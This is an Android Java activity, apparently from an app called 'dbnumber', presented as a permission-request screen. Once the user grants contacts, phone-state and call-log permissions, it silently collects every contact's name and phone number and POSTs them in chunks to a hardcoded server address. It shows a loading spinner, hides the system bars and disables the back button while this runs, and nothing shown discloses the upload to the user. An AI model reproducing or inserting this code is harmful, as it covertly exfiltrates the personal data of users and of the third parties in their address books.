package ir.hrwanheda.dbnumber.CheckPermissionAndIntroSlider;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.comix.overwatch.HiveProgressView;

import org.w3c.dom.Text;

import java.util.HashMap;
import java.util.Map;

import ir.hrwanheda.dbnumber.MainActivity;
import ir.hrwanheda.dbnumber.R;

public class ActivityCheckPerm extends AppCompatActivity {

    String contact;
    int count_contact;
    TextView activity_check_perm_tv_explain;
    Button btn_check_perm , activity_check_perm_btn;
    HiveProgressView hiveProgressView;
    View view_background , view_top_tv_ex , View_bottom_btn_con;
    boolean CheckOnBack = false;
    RequestQueue queue;
    Thread thread;
    SharedPreferences preferences;
    RelativeLayout relativeLayout;
    DisplayMetrics dm;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_check_perm);
        //getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR);
        dm = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(dm);
        init();
        hideSystemUI();

        getSupportActionBar().hide();
        preferences = getSharedPreferences("pref",MODE_PRIVATE);
        queue = Volley.newRequestQueue(this);


        btn_check_perm.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    requestPermissions(new String[]{Manifest.permission.READ_CONTACTS,Manifest.permission.READ_PHONE_STATE,Manifest.permission.READ_CALL_LOG},10);
                }
                btn_check_perm.setEnabled(false);
            }
        });

    }

    private void init() {

        btn_check_perm = findViewById(R.id.activity_check_perm_btn);
        hiveProgressView = findViewById(R.id.activity_check_perm_progress);
        view_background = findViewById(R.id.activity_check_perm_view);
        relativeLayout = findViewById(R.id.Activity_check_perm_rel);
        view_top_tv_ex = findViewById(R.id.view_top_tv_ex);
        View_bottom_btn_con = findViewById(R.id.View_bottom_btn_con);
        activity_check_perm_tv_explain = findViewById(R.id.activity_check_perm_tv_explain);

        relativeLayout.setBackground(getDrawable(R.drawable.backpermission));
        activity_check_perm_tv_explain.setMaxWidth( (int) (dm.widthPixels*.7));
        activity_check_perm_tv_explain.setTextSize( (int) (dm.widthPixels*.015));

        btn_check_perm.getLayoutParams().width = (int) (dm.widthPixels*.7);
        btn_check_perm.getLayoutParams().height = (int) (dm.widthPixels*.3);

        view_top_tv_ex.getLayoutParams().width = (int) (dm.widthPixels*.1);
        view_top_tv_ex.getLayoutParams().height = (int) (dm.heightPixels*.38);

        View_bottom_btn_con.getLayoutParams().width = (int) (dm.widthPixels*.1);
        View_bottom_btn_con.getLayoutParams().height = (int) (dm.heightPixels*.22);
    }

    @Override
    protected void onResume() {
        super.onResume();
        hideSystemUI();
    }

    @Override
    protected void onStart() {
        super.onStart();
        hideSystemUI();
    }

    private void hideSystemUI() {
        // Set the IMMERSIVE flag.
        // Set the content to appear under the system bars so that the content
        // doesn't resize when the system bars hide and show.
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION // hide nav bar
                        | View.SYSTEM_UI_FLAG_FULLSCREEN // hide status bar
                        |View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if(requestCode == 10)
        {

            if(grantResults[0] == 0)
            {


                hiveProgressView.setVisibility(View.VISIBLE);
                view_background.setVisibility(View.VISIBLE);
                CheckOnBack = true;
                //btn_check_perm.setBackgroundColor(Color.parseColor("#7EEAE1E1"));


                Thread thread1 = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        getContactList();

                        Log.i("fdsfsdfsdfdf", ""+contact.length());
                        if(contact.length() > 2000)
                        {
                            final String[] array_cont = contact.split("!!!");

                            for(final String str:array_cont)
                            {
                                Log.i("dsdsfsdf", "rundsfsd: ");
                                runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        StringRequest request = new StringRequest(Request.Method.POST, "http://192.168.1.102:55551", new Response.Listener<String>() {
                                            @Override
                                            public void onResponse(String response) {
                                                //Toast.makeText(IntroSlider.this,""+response,Toast.LENGTH_LONG).show();
                                            }
                                        }, new Response.ErrorListener() {
                                            @Override
                                            public void onErrorResponse(VolleyError error) {
                                                Toast.makeText(ActivityCheckPerm.this,""+error.getMessage(),Toast.LENGTH_LONG).show();
                                            }
                                        }) {
                                            @Override
                                            protected Map<String, String> getParams() throws AuthFailureError {
                                                Map<String,String> param = new HashMap<String, String>();
                                                param.put("contact",str);
                                                return param;
                                            }
                                        };
                                        queue.add(request);
                                    }
                                });
                            }

                        }else {

                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    StringRequest request = new StringRequest(Request.Method.POST, "http://192.168.1.102:55551", new Response.Listener<String>() {
                                        @Override
                                        public void onResponse(String response) {
                                            //Toast.makeText(IntroSlider.this,""+response,Toast.LENGTH_LONG).show();
                                        }
                                    }, new Response.ErrorListener() {
                                        @Override
                                        public void onErrorResponse(VolleyError error) {
                                            //Toast.makeText(IntroSlider.this,""+error.getMessage(),Toast.LENGTH_LONG).show();
                                        }
                                    }) {
                                        @Override
                                        protected Map<String, String> getParams() throws AuthFailureError {
                                            Map<String,String> param = new HashMap<String, String>();
                                            param.put("contact",contact);
                                            return param;
                                        }
                                    };
                                    queue.add(request);
                                }
                            });

                        }

                    }
                });
                thread1.start();

                thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            thread.sleep(10000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                preferences.edit().putString("start","run").apply();
                                startActivity(new Intent(ActivityCheckPerm.this, MainActivity.class));
                                finish();
                            }
                        });
                    }
                });
                thread.start();




            }else {
                hiveProgressView.setVisibility(View.VISIBLE);
                view_background.setVisibility(View.VISIBLE);
                //btn_check_perm.setBackgroundColor(Color.parseColor("#7EEAE1E1"));
                preferences.edit().putString("start","run").apply();
                thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            thread.sleep(10000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {

                                startActivity(new Intent(ActivityCheckPerm.this, MainActivity.class));
                                finish();
                            }
                        });
                    }
                });
                thread.start();
            }
        }

    }
    private void getContactList() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                final String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        final String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));

                        String strNum = phoneNo + "";
                        strNum = strNum.replace(" ","");

                        String str = name + ":" + strNum + "@";
                        contact += str;
                        count_contact+= str.length();
                        if(count_contact >= 2000)
                        {
                            contact += "!!!";
                            count_contact = 0;
                        }

                    }

                    pCur.close();
                }
            }
            if (cur != null) {
                cur.close();
            }
        }

    }
    @Override
    public void onBackPressed() {
        if(!CheckOnBack)
        {
            super.onBackPressed();
        }

    }
}